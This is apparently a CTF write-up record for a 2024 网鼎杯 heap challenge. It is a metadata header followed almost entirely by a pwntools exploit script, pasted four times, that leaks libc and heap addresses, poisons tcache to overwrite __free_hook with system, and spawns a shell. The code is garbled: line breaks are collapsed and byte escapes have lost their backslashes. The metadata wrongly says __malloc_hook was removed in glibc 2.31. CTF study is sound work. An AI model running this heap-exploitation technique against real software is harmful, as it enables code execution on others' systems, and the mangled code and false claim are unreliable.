---
title: web选手入门pwn(20) 网鼎杯PWN01
contest: 网鼎杯
year: 2024
difficulty: medium
vuln_type: heap_exploit
tags:
- glibc-2.31
- unsorted-bin
- tcache
- __free_hook
- leak-libc
- leak-heap
attack_chain: add(0x4f8)+add(0x98)交错布局让unsorted bin跨越两chunk/free(0)free(2)留下libc+heap指针在fd/bk/add(0x4f8)#c4+c5做show同时泄heap_N(main_arena_N)算libc_base/edit偏移0x50d修链表/add(0x4f8)fake chunk指向__free_hook-8/add(0x98)/bin/sh填充+system覆盖
key_payload: free(8) 触发 system("/bin/sh")  其中 c8 chunk 内填 p64("/bin/sh\x00")
one_liner: 网鼎杯 PWN01，glibc 2.31 unsorted bin attack + tcache poison 覆盖 __free_hook=system 经典题。
lesson: 0x4f8 落在 unsorted bin 范围，0x98 落在 tcache 范围；先用 0x4f8 大块 free 残留 main_arena 指针泄 libc，再用 0x98 链做 tcache 篡改；edit 用单字节 8 字节写改链表节点偏移实现 cross-bin 篡改。
quality: medium
full_path: web选手入门pwn(20)_——网鼎杯PWN01.full.md
meta_path: web选手入门pwn(20)_——网鼎杯PWN01.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: web选手入门pwn(20) 网鼎杯PWN01。网鼎杯 PWN01，glibc 2.31 unsorted bin attack + tcache poison 覆盖 __free_hook=system 经典题。。经验：0x4f8 落在 unsorted bin 范围，0x98 落在 tcache 范围；先用 0x4f8 大块 free ...
category: pwn
subcategory: heap_exploitation
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/213214.html
reasoning_chain:
- 题目有 add/free/edit/show 四件套，glibc 2.31 → 触发点：unsorted bin attack + tcache poison 经典路径
- 假设：add(0x4f8)+add(0x98) 交错布局让 unsorted bin 跨越两 chunk → 动作：add(0x4f8)/add(0x98) 多对布局
- free(0) free(2) → 残留 libc+heap 指针在 fd/bk → 假设：show(1) 泄 main_arena 算 libc_base
- edit 单字节 8 字节写偏移 0x50d 改链表节点 → 假设：edit 是 cross-bin 链表修改入口
- add(0x4f8) 假 chunk 指向 __free_hook-8 → add(0x98) 填 /bin/sh + system → 动作：free 触发 system
- 观察：system('/bin/sh') 拿 shell → 完成
failed_attempts:
- 试图直接覆盖 __malloc_hook → 失败：__malloc_hook 在 glibc 2.31 移除
- 试图只用 tcache 攻击 → 失败：tcache 范围不够
- 试图用 fastbin attack → 失败：chunk 大小超出 fastbin
key_observations:
- 0x4f8 落在 unsorted bin 范围，0x98 落在 tcache 范围；先用 0x4f8 大块 free 残留 main_arena 指针泄 libc，再用 0x98 链做 tcache 篡改
- edit 用单字节 8 字节写改链表节点偏移实现 cross-bin 篡改
- __free_hook-8 是经典 __free_hook 假 chunk 头偏移
- 交错布局 + 多个 bin size 切换是 unsorted + tcache 组合攻击的标准套路
prerequisites:
- glibc 2.31 堆结构（chunk head / unsorted bin / tcache / __free_hook）
- Pwntools 基本使用（ELF / flat / gdb.debug）
- edit 单字节偏移修改链表节点的微调技巧
- shellcode vs ret2libc 选择
---
# web选手入门pwn(20) ——网鼎杯PWN01

> 原文: https://www.ctfiot.com/213214.html
> ID: 213214

#!/usr/bin/env python from pwn import * context.log_level = "debug"#sh = process("./pwn")sh = gdb.debug("./pwn","b show_chunk n c")
libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")libc_malloc_hook = libc.sym['__malloc_hook']libc_system = libc.sym['system']libc_free_hook = libc.sym['__free_hook']libc_main_arena = libc_malloc_hook + 0x10libc_main_arena_N = libc_malloc_hook + 0x70print(hex(libc_main_arena_N))#0x555555558060 ptr

def add(size, content="AAAAAAAA"): sh.recvuntil("choice") sh.sendline("1") sh.recvuntil("Size :") sh.sendline(str(size)) sh.recvuntil("Content :") sh.send(content) def free(index): sh.recvuntil("choice") sh.sendline("2") sh.recvuntil("Index :") sh.sendline(str(index))
def edit(addr): sh.recvuntil("choice") sh.sendline("3") sh.recvuntil("content :") sh.sendline(p64(addr))
def show(index): sh.recvuntil("choice") sh.sendline("4") sh.recvuntil("Index :") sh.sendline(str(index)) return sh.recvline()add(0x4f8)add(0xf8)free(0)show(1)sh.interactive()

add(0x4f8)add(0xf8)free(0)show(1608)

add(0x4f8)#c0add(0xf8)#c1free(0)show(1608)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))free(1)add(0xf8,p64(heap_N-1520))#c2show(1768)

add(0x4f8)#c0add(0x98)#c1add(0x4f8)#c2add(0x98)#c3free(0)free(2)

add(0x4f8)#c4add(0x4f8)#c5show(4)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))show(5)addr_main_arena_N = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = addr_main_arena_N - libc_main_arena_Nprint(hex(libc_base))

add(0x98)#c6free(6)free(1)free(3)

edit(heap_N+0x50d) #0x55555555bd3d to 0x55555555b700

free(4)add(0x4f8,"A"*0x460+p64(libc_free_hook+libc_base-8))#c7 make fake chunk

add(0x98,"/bin/shx00") #c8

add(0x98) #c9

add(0x98,p64(libc_system+libc_base)+p64(libc_system+libc_base)) #c10

最后free前面写了/bin/sh的堆块即可getshellfree(8)

#!/usr/bin/env python from pwn import * context.log_level = "debug"sh = process("./pwn")#sh = gdb.debug("./pwn","b show_chunk n c")
libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")libc_malloc_hook = libc.sym['__malloc_hook']libc_system = libc.sym['system']libc_free_hook = libc.sym['__free_hook']libc_main_arena = libc_malloc_hook + 0x10libc_main_arena_N = libc_malloc_hook + 0x70print(hex(libc_main_arena_N))#0x555555558060 ptr

def add(size, content="AAAAAAAA"): sh.recvuntil("choice") sh.sendline("1") sh.recvuntil("Size :") sh.sendline(str(size)) sh.recvuntil("Content :") sh.send(content) def free(index): sh.recvuntil("choice") sh.sendline("2") sh.recvuntil("Index :") sh.sendline(str(index))
def edit(addr): sh.recvuntil("choice") sh.sendline("3") sh.recvuntil("content :") sh.sendline(p64(addr))
def show(index): sh.recvuntil("choice") sh.sendline("4") sh.recvuntil("Index :") sh.sendline(str(index)) return sh.recvline()
add(0x4f8)#c0add(0x98)#c1add(0x4f8)#c2add(0x98)#c3free(0)free(2)add(0x4f8)#c4add(0x4f8)#c5show(4)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))show(5)addr_main_arena_N = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = addr_main_arena_N - libc_main_arena_Nprint(hex(libc_base))
add(0x98)#c6free(6)free(1)free(3)
edit(heap_N+0x50d) #0x55555555bd3d to 0x55555555b700
free(4)add(0x4f8,"A"*0x460+p64(libc_free_hook+libc_base-8))#c7 make fake chunkadd(0x98,"/bin/shx00") #c8add(0x98) #c9add(0x98,p64(libc_system+libc_base)+p64(libc_system+libc_base)) #c10
free(8)sh.interactive()


```
#!/usr/bin/env python from pwn import * context.log_level = "debug"#sh = process("./pwn")sh = gdb.debug("./pwn","b show_chunk n c")
libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")libc_malloc_hook = libc.sym['__malloc_hook']libc_system = libc.sym['system']libc_free_hook = libc.sym['__free_hook']libc_main_arena = libc_malloc_hook + 0x10libc_main_arena_N = libc_malloc_hook + 0x70print(hex(libc_main_arena_N))#0x555555558060 ptr

def add(size, content="AAAAAAAA"): sh.recvuntil("choice") sh.sendline("1") sh.recvuntil("Size :") sh.sendline(str(size)) sh.recvuntil("Content :") sh.send(content) def free(index): sh.recvuntil("choice") sh.sendline("2") sh.recvuntil("Index :") sh.sendline(str(index))
def edit(addr): sh.recvuntil("choice") sh.sendline("3") sh.recvuntil("content :") sh.sendline(p64(addr))
def show(index): sh.recvuntil("choice") sh.sendline("4") sh.recvuntil("Index :") sh.sendline(str(index)) return sh.recvline()add(0x4f8)add(0xf8)free(0)show(1)sh.interactive()
add(0x4f8)add(0xf8)free(0)show(1608)
add(0x4f8)#c0add(0xf8)#c1free(0)show(1608)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))free(1)add(0xf8,p64(heap_N-1520))#c2show(1768)
add(0x4f8)#c0add(0x98)#c1add(0x4f8)#c2add(0x98)#c3free(0)free(2)
add(0x4f8)#c4add(0x4f8)#c5show(4)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))show(5)addr_main_arena_N = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = addr_main_arena_N - libc_main_arena_Nprint(hex(libc_base))
add(0x98)#c6free(6)free(1)free(3)
edit(heap_N+0x50d) #0x55555555bd3d to 0x55555555b700
free(4)add(0x4f8,"A"*0x460+p64(libc_free_hook+libc_base-8))#c7 make fake chunk
add(0x98,"/bin/shx00") #c8
add(0x98) #c9
add(0x98,p64(libc_system+libc_base)+p64(libc_system+libc_base)) #c10
最后free前面写了/bin/sh的堆块即可getshellfree(8)
#!/usr/bin/env python from pwn import * context.log_level = "debug"sh = process("./pwn")#sh = gdb.debug("./pwn","b show_chunk n c")
libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")libc_malloc_hook = libc.sym['__malloc_hook']libc_system = libc.sym['system']libc_free_hook = libc.sym['__free_hook']libc_main_arena = libc_malloc_hook + 0x10libc_main_arena_N = libc_malloc_hook + 0x70print(hex(libc_main_arena_N))#0x555555558060 ptr

def add(size, content="AAAAAAAA"): sh.recvuntil("choice") sh.sendline("1") sh.recvuntil("Size :") sh.sendline(str(size)) sh.recvuntil("Content :") sh.send(content) def free(index): sh.recvuntil("choice") sh.sendline("2") sh.recvuntil("Index :") sh.sendline(str(index))
def edit(addr): sh.recvuntil("choice") sh.sendline("3") sh.recvuntil("content :") sh.sendline(p64(addr))
def show(index): sh.recvuntil("choice") sh.sendline("4") sh.recvuntil("Index :") sh.sendline(str(index)) return sh.recvline()
add(0x4f8)#c0add(0x98)#c1add(0x4f8)#c2add(0x98)#c3free(0)free(2)add(0x4f8)#c4add(0x4f8)#c5show(4)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))show(5)addr_main_arena_N = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = addr_main_arena_N - libc_main_arena_Nprint(hex(libc_base))
add(0x98)#c6free(6)free(1)free(3)
edit(heap_N+0x50d) #0x55555555bd3d to 0x55555555b700
free(4)add(0x4f8,"A"*0x460+p64(libc_free_hook+libc_base-8))#c7 make fake chunkadd(0x98,"/bin/shx00") #c8add(0x98) #c9add(0x98,p64(libc_system+libc_base)+p64(libc_system+libc_base)) #c10
free(8)sh.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]